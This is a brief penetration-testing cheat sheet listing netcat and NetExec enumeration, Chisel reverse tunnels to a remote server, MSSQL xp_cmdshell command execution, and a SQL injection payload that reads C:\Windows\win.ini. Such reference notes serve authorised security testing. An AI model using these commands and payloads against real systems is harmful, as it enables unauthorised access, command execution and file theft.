---
description: A collection of tools and commands used for pentesting.
---

# Tools

#### Networking

```bash
# Check port with netcat
nc -nvz 192.168.178.1 80

# Netexec enumeration
nxc ssh 192.168.178.1
```

#### Chisel

```bash
# chisel client 
./chisel.exe client -v 10.0.52.31:2000 R:socks 
./chisel.exe client -v 10.0.52.31:2000 R:1433:127.0.0.1:1433

# chisel server op VM 
sudo ./chisel server --reverse -v -p 2000
```

#### Myssql

```bash
# MSSQL Command execution
EXEC xp_cmdshell "net user";
EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';
EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';

# Read file
-1 union select null,(select x from OpenRowset(BULK 'C:\Windows\win.ini',SINGLE_CLOB) R(x)),null,null
```

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-command-execution" %}
Many paylods
{% endembed %}
